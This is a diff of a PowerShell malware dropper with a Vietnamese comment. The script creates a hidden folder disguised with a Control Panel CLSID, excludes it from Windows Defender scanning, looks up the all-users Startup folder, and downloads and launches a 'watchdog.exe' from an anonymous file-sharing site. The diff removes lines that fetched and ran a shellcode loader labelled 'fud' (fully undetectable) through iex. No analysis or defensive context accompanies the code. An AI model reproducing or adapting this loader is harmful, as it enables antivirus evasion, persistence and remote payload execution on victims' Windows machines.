@@ -1,8 +1,5 @@
 $rdir = "$env:SystemDrive\ProgramData\Loader"
 $dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
-$process = "explorer.exe"
-$shellcode_pid = $pid
-$shellcode_loader = iwr "https://anonsharing.com/file/878b31fe7f3bd186/shellcode_loader_fud.ps1"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
 New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
@@ -26,7 +23,6 @@ Start-Process -FilePath $filePath -NoNewWindow
 
 $filePath = "$folderPath\watchdog.exe"
 $url = "https://anonsharing.com/file/0da952d4aeb48c3b/H-Output_(2).exe"
-iex $shellcode_loader
 # Kiểm tra nếu file chưa tồn tại thì tải về
 if (!(Test-Path $filePath)) {
     Invoke-WebRequest -Uri $url -OutFile $filePath
